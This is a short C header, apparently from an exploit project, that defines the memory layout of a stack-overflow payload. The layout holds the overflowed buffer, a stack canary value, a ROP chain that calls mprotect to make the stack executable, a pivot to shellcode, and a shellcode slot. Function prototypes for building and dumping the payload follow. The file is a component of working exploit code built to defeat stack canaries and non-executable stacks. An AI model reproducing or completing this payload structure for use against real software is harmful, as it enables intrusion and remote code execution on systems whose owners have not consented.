#ifndef _PAYLOAD_H_
#define _PAYLOAD_H_
#include "addresses.h"
#include "shellcode.h"

typedef struct Payload {
	// Stack frame from/including the buffer
	AddressUnion	pl_dst;
	AddressUnion	pl_canary;

	// ROP chain to make the stack executable
	AddressUnion	pl_rbp;
	AddressUnion	pl_popRDI;
	AddressUnion	pl_stackPage;
	AddressUnion	pl_popRSI;
	ptrdiff_t	pl_stackSize;
	AddressUnion	pl_popRDX;
	long		pl_permission;
	AddressUnion	pl_mprotect;

	// Stack pivot to executable code (&pl_scu)
	AddressUnion	pl_shellCode;

	// Freedom!
	ShellcodeUnion	pl_scu;
} Payload, *PayloadPtr;

extern void	initload(PayloadPtr plp);
extern ssize_t	makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np);
extern void	dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr);

#endif
